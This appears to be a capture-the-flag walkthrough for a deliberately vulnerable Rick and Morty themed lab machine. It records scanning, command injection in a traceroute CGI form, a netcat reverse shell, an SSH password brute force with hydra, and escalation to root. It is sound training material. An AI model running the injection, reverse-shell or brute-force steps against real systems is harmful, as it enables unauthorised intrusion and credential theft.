@@ -1,0 +1,283 @@
+we should get 130 points and also get root
+
+$ netdiscover -i wlp2s0
+192.168.1.10
+
+$ nmap -A 192.168.1.10 -p- -T4 -Pn 
+
+PORT      STATE SERVICE    VERSION
+21/tcp    open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.1.6
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh?
+| fingerprint-strings: 
+|   NULL: 
+|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.27 (Fedora)
+|_http-title: Morty's Website
+9090/tcp  open  http       Cockpit web service
+| http-title: localhost.localdomain
+|_Requested resource was https://necromancer:9090/
+13337/tcp open  tcpwrapped
+22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
+|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
+|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
+60000/tcp open  unknown
+|_drda-info: ERROR
+| fingerprint-strings: 
+|   NULL, ibm-db2: 
+|_    Welcome to Ricks half baked reverse shell...
+
+
+
+
+first go to http://192.168.1.10:9090
+
+there is our first flag 
+
+
+FLAG {There is no Zeus, in your face!} - 10 Points
+
+
+now let brute force directories with dirb
+
+$ dirb http://192.168.1.10/
+
+---- Scanning URL: http://192.168.1.10/ ----
++ http://192.168.1.10/cgi-bin/ (CODE:403|SIZE:217)                                                                                                           
++ http://192.168.1.10/index.html (CODE:200|SIZE:326)                                                                                                         
+==> DIRECTORY: http://192.168.1.10/passwords/                                                                                                                
++ http://192.168.1.10/robots.txt (CODE:200|SIZE:126)                                                                                                         
+                                                                                                                                                             
+---- Entering directory: http://192.168.1.10/passwords/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+
+# go to http://192.168.1.10/passwords/FLAG.txt
+
+FLAG{Yeah d- just don't do it.} - 10 Points here is another flag
+
+
+# go to http://192.168.1.10/passwords/passwords.html
+
+open the source code 
+
+<!--Password: winter-->
+
+let it just be here till we find what's password is this.
+
+
+
+# now go to http://192.168.1.10/cgi-bin/
+
+there is a form that takes an ip and traceroute it 
+
+there might be a code injection here
+
+lets see, enter 192.168.1.0 ; ls -la
+
+yes we executed the code on the server 
+
+now lets get a reverse shell
+
+first set up a listener on the local machine
+
+$ nc -lnvp 4444
+
+now on the target machine type
+
+192.168.1.0; nc -c bash 192.168.1.6 4444
+
+and we got the shell
+
+
+lets see system users
+
+cat command desnot work
+lets use less command
+
+$ less /etc/passwd
+
+RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+Morty:x:1001:1001::/home/Morty:/bin/bash
+Summer:x:1002:1002::/home/Summer:/bin/bash
+
+
+lets try ssh with this usernames and with password winter 
+
+it worked for summer
+
+$ ssh -l Summer 192.168.1.0 -p 22222
+
+$ ls
+FLAG.txt
+
+$ less FLAG.txt
+
+FLAG{Get off the high road Summer!} - 10 Points
+
+
+lets navigate around to see what we have 
+
+$ cd /home
+
+$ ls 
+Morty  RickSanchez  Summer
+$ cd Morty
+$ ls
+journal.txt.zip  Safe_Password.jpg
+
+I used simple python http server to download this files
+
+$ python -m SimpleHTTPServer
+
+and in my local machine I look in the Safe_Password.jpg
+
+$ strings Safe_Password.jpg
+
+8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+
+I saw this line
+
+and used this password to opne journal.txt.zip
+
+and in that file 
+
+
+
+
+Monday: So today Rick told me huge secret.
+He had finished his flask and was on to commercial grade paint solvent.
+He spluttered something about a safe, and a password.
+Or maybe it was a safe password... 
+Was a password that was safe? 
+Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points
+
+
+
+lets look at some other areas
+
+$ nc 192.168.1.10 13337
+
+FLAG:{TheyFoundMyBackDoorMorty}-10Points
+
+till now 60 points
+
+$ nc 192.168.1.0 60000
+FLAG{Flip the pickle Morty!} - 10 Points
+
+$whoami
+root
+
+this is a root backdoor, but a restricted one
+
+
+lets look at some ftp protocol
+
+https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/
+there is a good article about ftp
+
+
+lets go to ftp://192.168.1.10
+
+we see there is a flag file and pub directory
+
+download flag file and read it
+
+FLAG{Whoa this is unexpected} - 10 Points
+
+
+
+# now lets move on to the rick home directory and see what he's got.
+
+cd /home/RickSanchez/RICKS_SAFE
+
+there is a file called safe in this directory 
+used pythonhttpserver  to download it
+
+
+when I executed it I saw
+Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
+
+but when I executed it wiht password we found before 
+
+$ ./safe 131333
+
+decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+
+Ricks password hints:
+ (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+Follow these clues, in order
+
+
+1 uppercase character
+1 digit
+One of the words in my old bands name.�	@
+
+When I googled it I found that "The Flesh Curtains"
+is ricks old band name
+
+and I wrote a python script to generate the desired password
+
+upper_case = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+digit="0123456789"
+band_name="Flesh"
+band_name_word2 = "Curtains"
+
+for i in upper_case:
+    for j in digit:
+        for k in band_name:
+            print(i+j+band_name)
+            print(i+j+band_name_word2)
+			
+$python password_gen > passwords.txt
+
+and used hydra to brute force ssh service
+$ hydra -s 22222 -l RickSanchez -P passwords.txt 192.168.1.10 -t 4 ssh -V
+
+and the password is P7Curtains
+
+let ssh into ricks account
+
+$ ssh -l RickSanchez 192.168.1.10
+
+and we are in
+
+$ sudo -l
+
+$ sudo su 
+$ whoami
+root
+
+cd /root
+less FLAG.txt
+
+FLAG: {Ionic Defibrillator} - 30 points
+
+and the last flag
+
